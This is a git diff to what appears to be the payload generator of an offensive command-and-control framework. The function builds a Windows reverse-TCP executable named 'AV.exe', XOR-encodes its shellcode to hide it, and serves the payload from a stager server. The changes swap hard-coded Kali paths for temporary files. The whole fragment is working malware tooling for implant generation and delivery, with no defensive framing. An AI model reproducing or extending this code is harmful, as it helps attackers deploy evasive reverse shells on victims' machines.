@@ -129,11 +129,11 @@ def generate_exe_reverse_tcp(ip, port, stager_ip, stager_port):
 		with open(sc_path, "wb") as f:
 			f.write(shellcode)
 		
-		with open(sc_path, "rb") as f:
+		"""with open(sc_path, "rb") as f:
 			donut_file = f.read()
 
 		with open("/home/kali/tools/C2/Gunner/gunnerc2/implantdev/learning/c-reverse-shell/rveshell/new/donut_file.c", "wb") as f:
-			f.write(donut_file) 
+			f.write(donut_file)"""
 
 		# 6) XOR‑encode it using our XorEncode helper
 		encoder = XorEncode()
@@ -141,7 +141,10 @@ def generate_exe_reverse_tcp(ip, port, stager_ip, stager_port):
 		length = len(shellcode)
 		#print("AFTER length")
 
-		payload = encoder.main(sc_path, "/home/kali/tools/C2/Gunner/gunnerc2/implantdev/learning/c-reverse-shell/rveshell/new/output.bin", "deadbeefcafebabe", "/home/kali/tools/C2/Gunner/gunnerc2/core/payload_generator/windows/tcp/exe/c_output.c")
+		fd, output_trash = tempfile.mkstemp(suffix=".bin", text=True)
+		fd, xor_main_output = tempfile.mkstemp(suffix=".c", text=True)
+
+		payload = encoder.main(sc_path, output_trash, "deadbeefcafebabe", xor_main_output)
 		out = Path.cwd() / "AV.exe"
 		stage.start_stager_server(stager_port, payload, format="bin", ip=stager_ip)
 		print(brightgreen + f"[+] Serving shellcode via stager server {stager_ip}:{stager_port}")
